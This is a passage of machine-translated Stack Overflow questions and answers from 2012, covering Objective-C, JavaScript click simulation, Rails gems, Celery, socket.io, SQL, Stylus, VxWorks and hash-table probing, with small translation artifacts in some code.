一个类中的实例变量不可用于不同类的方法。您可以通过定义 getter 和 setter 方法或通过定义属性（本质上是 getter 和 setter 方法的语法糖）来公开接口以从类外部获取和设置实例变量。请参阅 Objective-C 编程的[声明属性](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/ObjectiveC/Chapters/ocProperties.html#//apple_ref/doc/uid/TP30001163-CH17-SW1)一章语言了解详情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:29:39.717

好吧，如果 MyString 属于 MyAppViewController 对象，那么您至少需要对控制器的引用。假设您调用它`controller`。

然后，如果您希望 MyString 可以作为其他类的属性访问，则必须将其声明为：

```
@interface MyAppViewController : UIViewController
@property (strong, nonatomic) NSString *MyString;
@end 
```

然后在您的应用委托中：

```
- (void)applicationWillTerminate:(UIApplication *)application {
    NSUserDefaults * defaults = [NSUserDefaults standardUserDefaults];
    [defaults setObject:controller.MyString forKey:@"MyString"]; //<-- This is where it all goes wrong. MyString is shown as undeclared identifier.
    [defaults synchronize];
} 
```

另外作为旁注，您可能需要仔细检查您的命名约定以清楚起见。

# javascript - 使用 javascript 在 x/y 坐标处模拟点击

> ID：10305477
> 
> 赞同：5
> 
> 时间：2012-04-24T20:24:24.763
> 
> 标签：javascript, jquery, click, simulate

如何使用 javascript 或 jquery 模拟 x/y 坐标的点击？

我将多次使用该脚本，并且我希望该脚本先单击位置一，然后单击位置二，然后单击位置三，然后单击位置四，依此类推。

最好不移动鼠标光标，但如果它必须移动，那也很好。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-04-24T20:34:13.957

这实际上可以通过该`document.elementFromPoint`方法来完成。一个 jQuery 示例：

```
function simulateClick(x, y) {
    jQuery(document.elementFromPoint(x, y)).click();
}
simulateClick(100, 250);
simulateClick(400, 250); 
```

**编辑：**这是一个工作示例：http: [//jsfiddle.net/z5YjY/](http://jsfiddle.net/z5YjY/)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-10-24T15:40:08.247

在第二次拍摄时，我会分享我的经验，并更新 Prestaul 的答案。

在大多数情况下，您不只是想点击一个元素来引发“onclick”事件，而是想将点击信息用于某些事情（例如：将滑块移到那里，或者在那个位置放一个弹出窗口）地方）。

我主要使用 vanilla js，但它与 $ 很好地融合在一起。

```
function simulateClick(x, y) {
    var clickEvent= document.createEvent('MouseEvents');
    clickEvent.initMouseEvent(
    'click', true, true, window, 0,
    0, 0, x, y, false, false,
    false, false, 0, null
    );
    document.elementFromPoint(x, y).dispatchEvent(clickEvent);
} 
```

基本上，这将通过事件传递正确的 pageX / pageY，以供进一步使用。

我也更新了小提琴，以展示这些坐标的使用：http: [//jsfiddle.net/V4CdC/](http://jsfiddle.net/V4CdC/)

# ruby-on-rails - Rails 3 - rails-dbd-mysql gem 依赖于 mysql 而不是 mysql2

> ID：10305478
> 
> 赞同：2
> 
> 时间：2012-04-24T20:24:26.957
> 
> 标签：ruby-on-rails

我正在尝试捆绑 rails-dbd-mysql 但它尝试安装旧的 mysql gem 而不是新的 mysql2 gem。我该怎么做才能使这个与mysql2一起工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-13T18:03:51.847

如果您有兴趣深入研究源代码，可以通过修改[lib/dbd/Mysql.rb](https://github.com/raphaelcosta/rails-dbd-mysql/blob/master/lib/dbd/Mysql.rb)文件来实现。具体来说：

```
begin
    require 'rubygems'
    gem 'mysql'
    gem 'dbi'
rescue LoadError => e
end

require 'dbi'
require "mysql"
require "thread"   # for Mutex 
```

将 s更改`mysql`为`mysql2`s 并重新安装 gem。整个程序中可能会有更多分散，因此请确保全部查找。

**编辑**：您可以尝试在[build/rake_task_lib.rb](https://github.com/raphaelcosta/rails-dbd-mysql/blob/master/build/rake_task_lib.rb)文件中。特别是这段代码：

```
DBD_GEM_DEP_MAP = {
    'pg'      => 'pg',
    'mysql'   => 'mysql', #change this to mysql2, or add mysql2 to the list
    'sqlite'  => 'sqlite-ruby',
    'sqlite3' => 'sqlite3-ruby'
} 
```

# javascript - 为什么jquery空函数这么复杂？

> ID：10305479
> 
> 赞同：3
> 
> 时间：2012-04-24T20:24:35.153
> 
> 标签：javascript, jquery, html

我查看了函数的`jQuery`源代码：`.empty()`

```
empty: function() {
        for ( var i = 0, elem; (elem = this[i]) != null; i++ ) {
            // Remove element nodes and prevent memory leaks
            if ( elem.nodeType === 1 ) {
                jQuery.cleanData( elem.getElementsByTagName("*") );
            }

            // Remove any remaining nodes
            while ( elem.firstChild ) {
                elem.removeChild( elem.firstChild );
            }
        }​ 
```

`innerHTML`仅将 更改为空字符串就不能简单得多：

```
empty: function() {
        for ( var i = 0, elem; (elem = this[i]) != null; i++ ) {
                elem.innerHTML = "";
        }​ 
```

`empty` [文档](http://api.jquery.com/empty/)：_

> 描述：从 DOM 中删除匹配元素集的所有子节点。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-24T20:25:54.553

想想`.data()`expandos和事件处理程序……只要删除DOM，你每次都会造成内存泄漏。

# ios - Intellij IDEA 上适用于 iOS 的 Ad hoc 打包 flex 应用程序

> ID：10305480
> 
> 赞同：1
> 
> 时间：2012-04-24T20:24:35.167
> 
> 标签：ios, apache-flex, air, intellij-idea, adt

我是 iOS 和 Intellij IDEA 的新手...

我为 Android 和 iOS 编写了一个小型 flex 应用程序。虽然在我的 Android 设备上部署该应用程序进行测试非常简单，但我现在只能在我的 iOS 设备上测试该应用程序。

到目前为止我做了什么：

*   申请开发证书（通配符）
*   将我的设备添加到门户

[如此处](https://developer.apple.com/library/ios/#documentation/ToolsLanguages/Conceptual/YourFirstAppStoreSubmission/ProvisionYourDevicesforDevelopment/ProvisionYourDevicesforDevelopment.html "这里")所述。

由于我现在不在 Xcode 上开发，我不能再按照描述进行操作，必须使用 Intellij-Way。

顺便提一句。我在 Mac (Lion) 上使用 Intellij IDEA 11.1.1。

在我的 IDE 中，我为 ADT 配置了 iOS 部分，如下所示：

[截屏](https://i.stack.imgur.com/Qw9tx.png)

到现在为止还挺好。

当我为临时包运行打包过程时，我总是收到以下消息：

```
9:42:32 PM Compilation completed successfully
9:42:34 PM Failed to package AIR application CatalogApp.ipa:
           Unable to open mobile provisioning profile. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:10:17.277

您的配置文件不正确。你需要一个 .mobileprovision

![在这里下载](../Images/ef2c082e7117e3a377bcc4a2b330a894.png)

这需要与您的证书相关联

# mysql - phpmyadmin 不显示 utf8 的表

> ID：10305481
> 
> 赞同：1
> 
> 时间：2012-04-24T20:24:38.210
> 
> 标签：mysql, phpmyadmin

我将数据库中的所有表都设置为 UTF8。当我尝试通过 phpmyadmin 访问它们时，它说数据库没有表。

当我发布`SHOW TABLES`时，它们都在那里。

为什么 phpmyadmin 没有显示表格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-11T01:10:34.893

解决了！我将我的 phpmyadmin 版本更新到最新的稳定版本，问题就消失了。

# django - Celery 任务完成后更新 Django 模型对象

> ID：10305487
> 
> 赞同：6
> 
> 时间：2012-04-24T20:24:54.653
> 
> 标签：django, celery, django-celery

一旦芹菜任务完成，我想更新我的模型对象。不过，我目前不知道如何去做。

这是文件的布局

### 模型.py

```
from photos.tasks import photo_download

class Photo(models.Model):
    ....fields....

@receiver(post_save)
def download_photo_callback(sender, **kwargs):
    photo = kwargs["instance"]
    result = photo_download.delay(photo.uid) 
```

### 任务.py

```
from photo.models import Photo

@task()
def photo_download(photo_uid, callback=None):
    ...do stuff...
    photo.status = 'D'
    photo.save() 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T21:30:32.777

您正在执行循环导入。您的`tasks.py`文件正在导入您的`models.py`文件，反之亦然。您应该将信号移动到单独的`signals.py`文件中以避免它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:32:49.140

文档中有一个示例：

[http://docs.celeryproject.org/en/latest/userguide/tasks.html#example](http://docs.celeryproject.org/en/latest/userguide/tasks.html#example)

请参阅 spam_filter 任务：

[http://docs.celeryproject.org/en/latest/userguide/tasks.html#blog-tasks-py](http://docs.celeryproject.org/en/latest/userguide/tasks.html#blog-tasks-py)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:31:55.927

让对方[阅读您的 Django 设置](http://www.b-list.org/weblog/2007/sep/22/standalone-django-scripts/)，以便它可以轻松更新模型。

# ios - NSString 到 const char * 转换为希腊字符

> ID：10305488
> 
> 赞同：0
> 
> 时间：2012-04-24T20:25:03.450
> 
> 标签：ios, nsstring, char, cons

我正在尝试将包含希腊词的 NSString 转换为 const char。我正在尝试使用用于希腊语言的 UTF-8 编码转换字符串，当我将字符注销时，它里面有垃圾。请在这里提供一点帮助..

```
//this is the greek word 
NSString *letter = textFieldLetter.text;

//NSString to const char conversion for the sql query
const char *cLetter = (const char *)[letter cStringUsingEncoding:NSUTF8StringEncoding]; 

//this contains junk!
NSLog(@"letter: %s",cLetter); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T00:34:04.450

您不必使用 UTF8，而是使用 Unicode ( **NSUnicodeStringEncoding** )。

如果你看到`NSStringEncoding`会看到这个选项（有更多）：

```
enum {
NSWindowsCP1253StringEncoding = 13,    /* Greek */
NSUTF16StringEncoding = NSUnicodeStringEncoding,   

NSUTF16BigEndianStringEncoding = 0x90000100,          /* NSUTF16StringEncoding encoding with explicit endianness specified */
NSUTF16LittleEndianStringEncoding = 0x94000100,       /* NSUTF16StringEncoding encoding with explicit endianness specified */

NSUTF32StringEncoding = 0x8c000100,                   
NSUTF32BigEndianStringEncoding = 0x98000100,          /* NSUTF32StringEncoding encoding with explicit endianness specified */
NSUTF32LittleEndianStringEncoding = 0x9c000100        /* NSUTF32StringEncoding encoding with explicit endianness specified */
};
typedef NSUInteger NSStringEncoding; 
```

您可以看到特定的希腊语：`NSWindowsCP1253StringEncoding`

如果不行，你可以尝试使用其他的UTF16或UTF32。但我认为 Unicode 适合你。

- 编辑

请记住，`NSLog(@"%s",string);`无法解码 unicode 字符。所以，它真的会显示混乱。

要测试它是否有效，请进行转换，然后重做。如果是相同的，那么您就不会丢失数据。

```
const char *cLetter = (const char *)[letter cStringUsingEncoding:NSUnicodeStringEncoding]; 
NSString *original = [NSString stringWithCString:cLetter encoding:NSUnicodeStringEncoding]; 
```

# bash - 使用 bash 从不同的行列中提取特定模式

> ID：10305489
> 
> 赞同：0
> 
> 时间：2012-04-24T20:25:06.787
> 
> 标签：bash, design-patterns

我有一些结果，我需要得到这样的模式：“./.”、“0/1”、“0/0”。
我怎样才能使用 bash 做到这一点？
谢谢。

```
G   A   89.43   PASS    AB=0.427;AC=2;AF=0.33;AN=6;BaseQRankSum=-1.468;DP=12;Dels=0.00;FS=0.000;HRun=1;HaplotypeScore=0.6373;MQ=60.00;MQ0=0;MQRankSum=0.536;QD=12.78;ReadPosRankSum=1.134;SB=-26.82;set=variant2    GT:AD:DP:GQ:PL  ./. 0/1:2,3:5:67.41:102,0,67    ./. 0/1:1,1:2:25.53:26,0,36 0/0:5,0:5:15.05:0,15,200 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:29:40.183

怎么样

```
grep -o './.' <<< "$results" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:31:45.127

我会使用perl。

```
echo "G   A   89.43   PASS    AB=0.427;AC=2;AF=0.33;AN=6;BaseQRankSum=-1.468;DP=12;Dels=0.00;FS=0.000;HRun=1;HaplotypeScore=0.6373;MQ=60.00;MQ0=0;MQRankSum=0.536;QD=12.78;ReadPosRankSum=1.134;SB=-26.82;set=variant2    GT:AD:DP:GQ:PL  ./. 0/1:2,3:5:67.41:102,0,67    ./. 0/1:1,1:2:25.53:26,0,36 0/0:5,0:5:15.05:0,15,200" \
  | perl -lne 'my @matches = m{(./.)}g; print join "\n", @matches;' 
```

这将返回：

```
./.
0/1
./.
0/1
0/0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:12:31.053

这可能对您有用：

```
sed 'G;:a;/^\n,*/{s///;;b};s/^\(.\/.\)\(.*\)/\2,\1/;ta;s/.//;ba' file
./.,0/1,./.,0/1,0/0 
```

# php - 使用socketIO开发网页游戏

> ID：10305492
> 
> 赞同：2
> 
> 时间：2012-04-24T20:25:08.423
> 
> 标签：php, javascript, html, socket.io

我是网络开发和网络技术的新手。为了学习，我正在尝试使用 websocket 创建多人游戏。游戏是“制作更大的单词”在这里我编写了一个代码，该代码将“随机”字母从基地发送到用户和拥有该字母 WIN 的更大单词的用户。

我有一个代码，但我在通过 socket.io API 与 base 连接时遇到了严重问题

给出创建单词的字母的代码：

```
<div id="s">STOP</div>

<div id="L1"></div>
<div id="L2"></div>
<div id="L3"></div>
<div id="L4"></div>
<div id="L5"></div>

$a="AGHBV";

v=setInterval(function(){for(i=0;i<6;i++){$("#L"+i).html(String.fromCharCode(Math.floor(Math.random()*26+65)))};},500);$("#s").click(function(){clearInterval(v);setTimeout(function(){for(j=0;j<$a.length;j++){$("#L"+(j+1)).html($a[j]);}},250);}); 
```

当用户单击 STOP div 时，他们会得到 $a 字母......所以当您通过 php 从 base 获取 a$ 但如何通过 socket.io 将这个 a$ 从服务器发送到客户端时，这非常容易

对于 socket.io，我有一些代码，但我不知道如何准确地工作。

这是套接字客户端文件：

```
<!DOCTYPE html>
<html>
<head>
    <style>
        * { margin:0; padding:0; font-size:11px; font-family:arial; color:#444; }
        body { padding:20px; }
        #message-list { list-style-type:none; width:300px; height:300px; overflow:auto; border:1px solid #999; padding:20px; }
        #message-list li { border-bottom:1px solid #ccc; padding-bottom:2px; margin-bottom:5px; }
        code { font-family:courier; background:#eee; padding:2px 4px; }
    </style>
    <script src="http://cdn.socket.io/stable/socket.io.js"></script>
    <script>

        // Create SocketIO instance
        var socket = new io.Socket('localhost',{
            port: 8080
        });
        socket.connect(); 

        // Add a connect listener
        socket.on('connect',function() {
            log('<span style="color:green;">Client has connected to the server!</span>');
        });
        // Add a connect listener
        socket.on('message',function(data) {
            log('Received a message from the server:  ' + data);
        });
        // Add a disconnect listener
        socket.on('disconnect',function() {
            log('<span style="color:red;">The client has disconnected!</span>');
        });

        // Sends a message to the server via sockets
        function sendMessageToServer(message) {
            socket.send(message);
            log('<span style="color:#888">Sending "' + message + '" to the server!</span>');
        }

        // Outputs to console and list
        function log(message) {
            var li = document.createElement('li');
            li.innerHTML = message;
            document.getElementById('message-list').appendChild(li);
        }

        /*
        // Create a socket instance
        socket = new WebSocket('ws://localhost:8080');

        // Open the socket
        socket.onopen = function(event) {
            console.log('Socket opened on client side',event);

            // Listen for messages
            socket.onmessage = function(event) {
                console.log('Client received a message',event);
            };

            // Listen for socket closes
            socket.onclose = function(event) {
                console.log('Client notified socket has closed',event);
            };

        };
        */

    </script>
</head>
<body>

    <p>Messages will appear below (and in the console).</p><br />
    <ul id="message-list"></ul>
    <ul style="margin:20px 0 0 20px;">
        <li>Type <code>socket.disconnect()</code> to disconnect</li>
        <li>Type <code>socket.connect()</code> to reconnect</li>
        <li>Type <code>sendMessageToServer('Your Message')</code> to send a message to the server</li>
    </ul>

</body>
</html> 
```

这是套接字服务器文件：

```
// Require HTTP module (to start server) and Socket.IO
var http = require('http'), io = require('socket.io');

// Start the server at port 8080
var server = http.createServer(function(req, res){ 

    // Send HTML headers and message
    res.writeHead(200,{ 'Content-Type': 'text/html' }); 
    res.end('<h1>Hello Socket Lover!</h1>');
});
server.listen(8080);

// Create a Socket.IO instance, passing it our server
var socket = io.listen(server);

// Add a connect listener
socket.on('connection', function(client){ 

    // Create periodical which ends a message to the client every 5 seconds
    var interval = setInterval(function() {
        client.send('This is a message from the server!  ' + new Date().getTime());
    },5000);

    // Success!  Now listen to messages to be received
    client.on('message',function(event){ 
        console.log('Received message from client!',event);
    });
    client.on('disconnect',function(){
        clearInterval(interval);
        console.log('Server has disconnected');
    });

}); 
```

我需要做什么才能得到我需要的。如何在我的脚本中实现 socketIO 以从服务器到客户端获取 a$ ......如何让服务器将 aa$ 从基础发送到客户端？？？

（对不起我的英语，我是网络技术的初学者。很抱歉一个小问题）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T03:34:52.150

这是一个很好的例子，说明如何将消息从服​​务器发送到客户端以及从客户端发送到服务器。这篇文章适合你，因为你的游戏有多个客户端。所以我认为最好的选择是在客户端之间广播消息。

在服务器..

```
io.sockets.on('connection', function (socket) {
    console.log('Socket Created...');

      socket.on('sendMessage', function (data) {
        socket.broadcast.emit('messageRecieve', data);
    });
}); 
```

在客户端，

```
 socket.on('messageRecieve', function (data) {//receive broadcasted message from server
        AppendMessage(data.msg);
    });

     function SendMessage() {// sends the message from client to the server may be on click
        var message = document.getElementById('text').value;
        socket.emit('sendMessage', { msg: message });
        AppendMessage(message);
    } 
```

这里有更多细节，[http://codetuner.blogspot.com/2012/04/real-time-web-sample-using-socketio-and.html](http://codetuner.blogspot.com/2012/04/real-time-web-sample-using-socketio-and.html)

# facebook - facebook api 从粉丝专页向“喜欢的人”发送私人消息

> ID：10305496
> 
> 赞同：0
> 
> 时间：2012-04-24T20:25:43.233
> 
> 标签：facebook, facebook-graph-api

我在 facebook 上有一个粉丝专页，我想给每个“喜欢”我的粉丝专页的成员发送私信。无论我是 facebook api 中的菜鸟。我需要一些光。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T01:28:50.473

API 不允许您访问喜欢特定页面的人。其他对象类型（如相册、照片等）可能是可能的，但页面除外。

# php - SQL IF NOT EXISTS - 当它确实存在时如何返回/解释

> ID：10305498
> 
> 赞同：1
> 
> 时间：2012-04-24T20:25:51.560
> 
> 标签：php, sql-server-2005

我有一个 IF NOT EXISTS 语句。如果它不存在，则后面是 INSERT 语句。如果存在，我需要了解什么是/可以返回，以便我可以用 PHP 解释它。

所以：

```
IF NOT EXISTS (SELECT id FROM users WHERE lname='SMITH')
INSERT INTO users (lname='SMITH') 
```

我认为否定不会返回任何结果，因此可以使用标准

```
if ($result){echo "record added";}
else {echo "duplicate - no record added";} 
```

但这不是正在发生的事情，我不确定如何实现我所需要的 - 有什么建议吗？

感谢您的关注。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:31:57.443

您可以尝试以下方法：

```
SET NOCOUNT ON
IF NOT EXISTS (SELECT id FROM users WHERE lname='SMITH')
  BEGIN
    INSERT INTO users (lname) VALUES('SMITH')
    SELECT 1
  END
ELSE
  SELECT 0 
```

并检查返回的标量 = 0 还是 1 ？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:32:23.923

在这两种情况下`$result`，都会返回成功运行命令的响应，仅此而已。 `INSERT`不会产生任何行，没有`IF`匹配条件的语句也不会产生。

`SELECT SCOPE_IDENTITY()`如果要检索插入的 ID，可以使用，然后可以检查是否`$result`返回了一行。

# php - 用于 Stylus 的 PHP 预处理器脚本/库？

> ID：10305503
> 
> 赞同：6
> 
> 时间：2012-04-24T20:26:32.713
> 
> 标签：php, css, stylus

是否有可用于 php的[“css stylus”解析器/库？](http://learnboost.github.com/stylus/)

如果不是，请提出类似的建议，如果不是更好的话。可能是一个轻量级的库，可以让你在 php 中更轻松地编写 css 代码。

Stylus 语法会从常规 CSS 脚本中去除所有冒号、分号、方括号和大多数括号。它的简洁和优雅让我想起了 Lisp。更令人惊奇的是，Stylus 还将在同一个文件中接受常规的 CSS 语法，从而减少多个贡献者之间可能存在的摩擦。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-14T20:39:08.710

我也在寻找[**PHP 的 Stylus 解析器**](https://github.com/AustP/Stylus.php)。在没有找到之后，我创建了一个基本的并将其放在 GitHub 上供其他人使用/改进。

**当前功能 2013 年 3 月 20 日：**

*   省略大括号
*   省略冒号
*   省略分号
*   自定义函数
*   导入其他文件
*   '&' 父引用
*   混合
*   插值
*   变量

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-21T13:21:59.223

撞。似乎仍然没有一种易于使用的方法将手写笔合并到 php 中。这是我的解决方法（仅限 Linux，仅限本地开发）。它的灵感来自我最近[关于 FAM](https://stackoverflow.com/questions/12933849/make-a-program-reload-an-already-opened-file-on-file-change)的另一个问题。

在ubuntu下安装incron和stylus，这将是

```
sudo apt-get install incron
sudo npm install stylus -g 
```

访问 incron 监视表

```
incrontab -e 
```

并添加以下内容并进行适当的修改：

```
/var/www/css/my.styl IN_MODIFY /usr/local/bin/stylus /var/www/css/my.styl 
```

这基本上意味着在文件更改时将 my.styl 重新编译到 my.css 中。

将生成的 css 添加到 html 标头

```
<link href="path/tom/my.css" rel="stylesheet" type="text/css" /> 
```

每当您保存`.styl`文件时，您`.css`都会在后台重新编译。跳过部署中的 styus 文件，使用重新编译的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T20:34:13.473

不，但是您可以考虑很多替代方案，例如[LESS](http://lesscss.org/)、[Sass](http://sass-lang.com/)、[HSS](http://ncannasse.fr/projects/hss)。也许其中之一有一个 PHP 解析器。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-26T20:47:26.127

为什么不直接使用原始的 Node.js 实现？

[`exec`](http://www.php.net/manual/en/function.exec.php)可以正常工作，但您应该只在开发环境中使用它。

```
<?php exec('/path/to/stylus stylesheet.styl'); ?> 
```

在生产中，为了性能和安全性，您应该预编译您的 Stylus。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-01-06T16:42:56.737

这不一定能回答你的问题，但我认为有些人可以从中找到真正的价值。PHP 中有 SCSS (Sass) 和 Less 编译器的实现：

[https://github.com/oyejorge/scssphp](https://github.com/oyejorge/scssphp)

[https://github.com/oyejorge/less.php](https://github.com/oyejorge/less.php)

Less.js 实现在 10 月 CMS 中用于编译资产，效果非常好，您不必预编译或观看。但是，它缺乏更好的错误记录。

这些可以作为实现 Stylus PHP 编译器的基础，也许？

# .net - .NET 和读取 xml 文件

> ID：10305514
> 
> 赞同：0
> 
> 时间：2012-04-24T20:27:36.317
> 
> 标签：.net, xml

我想阅读以下 xml 并在组合框中填充**知识标签，在文本框中填充****itemname**标记，以及在组合框中填充其余部分。任何代码示例都会非常有帮助。

```
<?xml version="1.0" encoding="UTF-8"?>
<swobs>
    <item>
          <knowledge>1</knowledge>
          <knowledge>2</knowledge>
          <knowledge>3</knowledge>
          <knowledge>4</knowledge>
          <itemname>INS Gator Operator</itemname>
          <knowhow>1</knowhow>
          <knowhow>2</knowhow>
          <knowhow>3</knowhow>
          <knowhow>4</knowhow>
          <supervisor>1</supervisor>      
          <supervisor>2</supervisor>      
          <supervisor>3</supervisor>      
          <supervisor>4</supervisor>  
       </item>              
</swobs> 
```

如果我试试这个：

```
public void LoadXML() { 
    string myXMLfile = Server.MapPath("~/swobs.xml"); 
    DataSet dssowbs = new DataSet(); 
    try 
    { 
          dssowbs.ReadXml(myXMLfile); 
          DropDownList1.DataSource = dssowbs;
          DropDownList1.DataValueField = "knowledge"; 
          DropDownList1.DataBind(); 
     } 
     catch (Exception ex) 
     { 
          Response.Write(ex.ToString()); 
     } 
} 
```

它抛出一个错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:35:48.107

学会爱上 LINQ……这就是这么简单：

```
private void LoadData()
        {
            var allData = XElement.Load("yourdatafile.xml");
            this.comboKnowledge.ItemsSource = allData.Descendants("knowledge").Select(x => x.Value);
            this.textItemName.Text = allData.Descendants("itemname").Select(x => x.Value).SingleOrDefault();
            this.comboKnowHow.ItemsSource = allData.Descendants("knowhow").Select(x => x.Value);
            this.comboSupervisor.ItemsSource = allData.Descendants("supervisor").Select(x => x.Value);
        } 
```

# php - HTML 中的 RegEx 与 preg-match 拆分

> ID：10305523
> 
> 赞同：0
> 
> 时间：2012-04-24T20:28:32.283
> 
> 标签：php, regex, preg-match

我有一个损坏的 html 页面，不幸的是我无法用 xml/xcode 解析，所以我想出了正则表达式。我是一个正则表达式初学者，但我无法得到正确的结果。

来源

```
<td>FIELD:</td> <td>VALUE<td> 
```

我想获得价值，这就是我卡住的地方

```
$regex = '{<td[^>]*<td>(.*?)</td>}'; 
```

编辑：结果我想要一个可以达到值的数组，所以我只对值感兴趣

我很感激每一个提示。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:42:06.950

试试这个：

`'{<td>.*?</td>\s+<td>(.*?)</td>}'`

但是您`/`在 html 文本中遗漏了 a 如果损坏，您的意思是在结束标记处缺少斜杠，您可以使用这个：

`'{<td>.*?</?td>\s+<td>(.*?)</?td>}'` 结束标签中的斜杠现在是可选的

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:38:21.723

您的正则表达式存在一些立即可见的问题；例如，`<td[^>]*<td>`不做你认为它做的事。但与其建议一个不同的正则表达式，让我敦促你做最理智的事情：

## 不要为此使用正则表达式！

相信我。不要这样做。其他人会来这里建议新的正则表达式模式，他们的模式都是**错误**的。[正则表达式甚至无法胜任解析干净的 HTML/XML 的任务](https://stackoverflow.com/a/1732454/399649)，因此尝试在任意损坏的代码上使用它是一种疯狂的做法。试试[HTML Tidy](http://www.w3.org/People/Raggett/tidy/)，它是为这类事情而设计的。根据 HTML 的问题，像[HtmlPurifier](http://htmlpurifier.org/)或[Beautiful Soup](http://www.crummy.com/software/BeautifulSoup/)这样的解析器也可能能够使用它。

这可能看起来需要更多的努力，但从长远来看，你会*节省*自己的时间。

# c - 重定向 VxWorks 串行输入

> ID：10305526
> 
> 赞同：0
> 
> 时间：2012-04-24T20:28:47.850
> 
> 标签：c, embedded, vxworks

我正在尝试将所有串行数据重定向到 VxWorks 中的一个进程。使用以下代码

```
fd = open("/tyCo/0", O_RDWR,0);
ioctl(fd, FIOSETOPTIONS, OPT_TERMINAL & ~OPT_7_BIT);
read(fd, line, 100); 
```

给出正确的输入，除了输入的第一个字符没有填充，而是打印到终端。因此，如果我输入“Hello”，则会打印出“H”并且 line="ello"。如果我不输入任何内容并按回车键，我会收到来自 VxWorks Shell 的提示。

我认为 VxWorks Shell 正在截取数据的第一个字母。我的猜测是我必须仅将 STDIO 重定向到新进程，但我发现的所有[文档都说使用 ioGlobalStdSet() ，这在 VxWorks 6.4 RTP 中不可用。](https://stackoverflow.com/questions/106453/how-do-i-redirect-tornado-vxworks-shell-output)如何重定向 STDIO 或从我的进程中终止 VxWorks Shell？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-10-10T21:41:12.500

如果您想将所有任务的输出重定向到当前的登录 shell，我认为答案是：

```
static int shellResourceReleaseHookAdd_once = 0;

void revert_out()
{
    ioGlobalStdSet( 1, consoleFd ); /* redirect all output to the consoleFd */
    ioGlobalStdSet( 2, consoleFd ); /* redirect all error to the consoleFd */
}

void redirect_out()
{
    ioGlobalStdSet( 1, ioTaskStdGet(0,1) ); /* redirect all output to the current shell */
    ioGlobalStdSet( 2, ioTaskStdGet(0,1) ); /* redirect all error to the current shell */

    if (shellResourceReleaseHookAdd_once == 0) {
        shellResourceReleaseHookAdd(revert_out); /* call revert_out() when current shell closes. */
        shellResourceReleaseHookAdd_once = 1;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T15:54:34.190

一种解决方法是使用 ioGlobalStdSet 将 IO 重定向到管道。然后，在 RTP 中，以读取模式打开管道。

在我的脑海中 - 在内核中：

```
dev = pipeDevCreate("/pipe/input", 10, 100);
kernFd = open("/pipe/input", O_RD, 0)
ioGlobalStdSet(1, kernFd) 
```

在 RTP 中：

rtpFd = open("/pipe/input", O_RD, 0); 读取（rtpFd，行，100）；

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T20:05:35.440

在 VxWorks 配置和编译期间禁用 shell 永久消除了该问题。也可以在 shell 中输入 exit 以暂时禁用它。

# hashmap - hashmap 和探测 - AVAILABLE 和 null？

> ID：10305527
> 
> 赞同：1
> 
> 时间：2012-04-24T20:28:48.157
> 
> 标签：hashmap, linear-probing

在线性探测中，有一个称为特殊值的值`AVAILABLE`，它会在删除项目时被替换。

当您插入一个键时，您会寻找一个空单元格（这只是意味着该单元格是`null`？）或包含的一个，`AVAILABLE`我不明白的是，如果空单元格意味着`null`而不是具有特殊值`AVAILABLE`，为什么不只是制作细胞`null`？

与使用相比有什么优势`AVAILABLE`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T21:53:26.363

在封闭散列（开放寻址）中，一个值被查找为：

1.  计算密钥哈希并从中确定“完美”的桶；
2.  如果bucket被占用并且key与查找的key相同，则返回value；
3.  如果桶未被占用，则以失败中止查找；
4.  转到下一个桶（使用线性探测只是增加桶索引）和步骤 2。

现在，假设您开始在桶 5 中查找并仅在桶 8 中找到您的密钥。如果擦除过程现在将桶 6 标记为未占用，由于步骤 3，您将永远无法到达桶 8。因此，我们需要一个特殊值将存储桶标记为“已占用”，但仍可插入。这可能是您的源术语`AVAILABLE`，并且`null`根本没有被占用。

**编辑：**顺便说一句，使用线性探测可以（相当）有效地摆脱这个特殊`AVAILABLE`值，但这会使擦除变得相当复杂。

# php - 使用 php 和 oracle 获取多个查询结果并显示到表中

> ID：10305529
> 
> 赞同：1
> 
> 时间：2012-04-24T20:28:58.010
> 
> 标签：php, html, sql, oracle

我的问题是我有一个链接到 Oracle 中多个表的网站。我目前有 PHP 代码检查分配给变量的用户输入以在表中查找数据，然后是 oci_fetch_row 语句来获取数据匹配的行。这工作正常，但如果某些值相同，我找不到如何从表中输出多于一行？

目前它抓取的一行被放入一个简单的 HTML 表中。

对于如何获取数据匹配的所有行并输出到表的任何帮助将不胜感激。

我的代码是：

```
